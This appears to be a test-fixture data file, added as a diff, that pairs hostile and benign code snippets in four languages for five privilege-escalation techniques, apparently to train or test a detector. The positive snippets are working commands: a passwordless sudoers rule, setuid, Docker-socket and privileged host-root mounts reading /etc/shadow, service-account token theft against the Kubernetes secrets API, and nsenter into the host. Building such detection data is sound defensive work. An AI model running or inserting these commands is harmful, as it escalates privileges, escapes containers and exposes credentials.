@@ -1,0 +1,214 @@
+family: t16
+sub_techniques:
+  - slug: sudo-setuid
+    positive: A tool gives itself administrator rights with a sudoers rule or the set-user-ID bit
+    negative: A tool makes its own script executable for its owner
+    ways:
+      typescript:
+        positive:
+          imports: |-
+            import { execSync } from "node:child_process";
+          body: |-
+            execSync("echo 'svc ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/svc");
+            execSync("chmod u+s /tmp/helper");
+        negative:
+          imports: |-
+            import { chmodSync } from "node:fs";
+          body: |-
+            chmodSync("./bin/run", 0o755);
+      python:
+        positive:
+          imports: |-
+            import os
+          body: |-
+            os.system("echo 'svc ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/svc")
+            os.system("chmod u+s /tmp/helper")
+        negative:
+          imports: |-
+            import os
+          body: |-
+            os.chmod("./bin/run", 0o755)
+      go:
+        positive:
+          imports: '"os/exec"'
+          body: |-
+            _ = exec.Command("sh", "-c", "echo 'svc ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/svc").Run()
+            _ = exec.Command("chmod", "u+s", "/tmp/helper").Run()
+        negative:
+          imports: '"os"'
+          body: |-
+            _ = os.Chmod("./bin/run", 0o755)
+      rust:
+        positive:
+          body: |-
+            let _ = std::process::Command::new("sh").arg("-c").arg("echo 'svc ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/svc").status();
+            let _ = std::process::Command::new("chmod").args(["u+s", "/tmp/helper"]).status();
+        negative:
+          imports: |-
+            use std::os::unix::fs::PermissionsExt;
+          body: |-
+            let _ = std::fs::set_permissions("./bin/run", std::fs::Permissions::from_mode(0o755));
+
+  - slug: docker-socket
+    positive: A tool starts a container through the Docker socket with the host's root mounted
+    negative: A tool lists the containers of its own project through the Docker socket
+    ways:
+      typescript:
+        positive:
+          imports: |-
+            import { execSync } from "node:child_process";
+          body: |-
+            execSync("docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine cat /host/etc/shadow");
+        negative:
+          imports: |-
+            import { execSync } from "node:child_process";
+          body: |-
+            execSync("docker -H unix:///var/run/docker.sock ps --filter label=project=fixture");
+      python:
+        positive:
+          imports: |-
+            import subprocess
+          body: |-
+            subprocess.run(["docker", "-H", "unix:///var/run/docker.sock", "run", "--rm", "-v", "/:/host", "alpine", "cat", "/host/etc/shadow"], check=False)
+        negative:
+          imports: |-
+            import subprocess
+          body: |-
+            subprocess.run(["docker", "-H", "unix:///var/run/docker.sock", "ps", "--filter", "label=project=fixture"], check=False)
+      go:
+        positive:
+          imports: '"os/exec"'
+          body: |-
+            _ = exec.Command("docker", "-H", "unix:///var/run/docker.sock", "run", "--rm", "-v", "/:/host", "alpine", "cat", "/host/etc/shadow").Run()
+        negative:
+          imports: '"os/exec"'
+          body: |-
+            _ = exec.Command("docker", "-H", "unix:///var/run/docker.sock", "ps", "--filter", "label=project=fixture").Run()
+      rust:
+        positive: {body: 'let _ = std::process::Command::new("docker").args(["-H", "unix:///var/run/docker.sock", "run", "--rm", "-v", "/:/host", "alpine", "cat", "/host/etc/shadow"]).status();'}
+        negative: {body: 'let _ = std::process::Command::new("docker").args(["-H", "unix:///var/run/docker.sock", "ps", "--filter", "label=project=fixture"]).status();'}
+
+  - slug: privileged-container-mount
+    positive: A tool starts a privileged container that mounts the host's root and changes root into it
+    negative: A tool starts an unprivileged container with one data folder mounted
+    ways:
+      typescript:
+        positive:
+          imports: |-
+            import { execSync } from "node:child_process";
+          body: |-
+            execSync("docker run --rm --privileged -v /:/host alpine chroot /host sh");
+        negative:
+          imports: |-
+            import { execSync } from "node:child_process";
+          body: |-
+            execSync("docker run --rm -v ./data:/data alpine ls /data");
+      python:
+        positive:
+          imports: |-
+            import os
+          body: |-
+            os.system("docker run --rm --privileged -v /:/host alpine chroot /host sh")
+        negative:
+          imports: |-
+            import os
+          body: |-
+            os.system("docker run --rm -v ./data:/data alpine ls /data")
+      go:
+        positive:
+          imports: '"os/exec"'
+          body: |-
+            _ = exec.Command("sh", "-c", "docker run --rm --privileged -v /:/host alpine chroot /host sh").Run()
+        negative:
+          imports: '"os/exec"'
+          body: |-
+            _ = exec.Command("docker", "run", "--rm", "-v", "./data:/data", "alpine", "ls", "/data").Run()
+      rust:
+        positive: {body: 'let _ = std::process::Command::new("sh").arg("-c").arg("docker run --rm --privileged -v /:/host alpine chroot /host sh").status();'}
+        negative: {body: 'let _ = std::process::Command::new("docker").args(["run", "--rm", "-v", "./data:/data", "alpine", "ls", "/data"]).status();'}
+
+  - slug: k8s-service-account-token
+    positive: A tool reads the cluster service-account token and uses it against the cluster API from outside its task
+    negative: A tool reads the namespace it runs in to label its own output
+    ways:
+      typescript:
+        positive:
+          imports: |-
+            import { readFileSync } from "node:fs";
+          body: |-
+            const token = readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/token", "utf8");
+            await fetch("https://kubernetes.default.svc/api/v1/secrets", { headers: { Authorization: `Bearer ${token}` } });
+        negative:
+          imports: |-
+            import { readFileSync } from "node:fs";
+          body: |-
+            console.error(readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "utf8"));
+      python:
+        positive:
+          imports: |-
+            import urllib.request
+          body: |-
+            token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()
+            urllib.request.urlopen(urllib.request.Request("https://kubernetes.default.svc/api/v1/secrets", headers={"Authorization": "Bearer " + token}))
+        negative: {body: 'print(open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read())'}
+      go:
+        positive:
+          imports: |-
+            "net/http"
+            "os"
+          body: |-
+            token, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
+            req, _ := http.NewRequest("GET", "https://kubernetes.default.svc/api/v1/secrets", nil)
+            req.Header.Set("Authorization", "Bearer "+string(token))
+            _, _ = http.DefaultClient.Do(req)
+        negative:
+          imports: |-
+            "fmt"
+            "os"
+          body: |-
+            ns, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
+            fmt.Println(string(ns))
+      rust:
+        positive:
+          body: |-
+            let token = std::fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/token").unwrap_or_default();
+            let _ = reqwest::Client::new().get("https://kubernetes.default.svc/api/v1/secrets").bearer_auth(token).send().await;
+        negative: {body: 'eprintln!("{}", std::fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/namespace").unwrap_or_default());'}
+
+  - slug: host-namespace-escape
+    positive: A tool enters the host's namespaces from inside a container
+    negative: A tool reads the container's own process list
+    ways:
+      typescript:
+        positive:
+          imports: |-
+            import { execSync } from "node:child_process";
+          body: |-
+            execSync("nsenter --target 1 --mount --uts --ipc --net --pid -- sh");
+        negative:
+          imports: |-
+            import { readFileSync } from "node:fs";
+          body: |-
+            console.error(readFileSync("/proc/self/status", "utf8").length);
+      python:
+        positive:
+          imports: |-
+            import os
+          body: |-
+            os.system("nsenter --target 1 --mount --uts --ipc --net --pid -- sh")
+        negative: {body: 'print(len(open("/proc/self/status").read()))'}
+      go:
+        positive:
+          imports: '"os/exec"'
+          body: |-
+            _ = exec.Command("nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "sh").Run()
+        negative:
+          imports: |-
+            "fmt"
+            "os"
+          body: |-
+            status, _ := os.ReadFile("/proc/self/status")
+            fmt.Println(len(status))
+      rust:
+        positive: {body: 'let _ = std::process::Command::new("nsenter").args(["--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "sh"]).status();'}
+        negative: {body: 'eprintln!("{}", std::fs::read_to_string("/proc/self/status").unwrap_or_default().len());'}
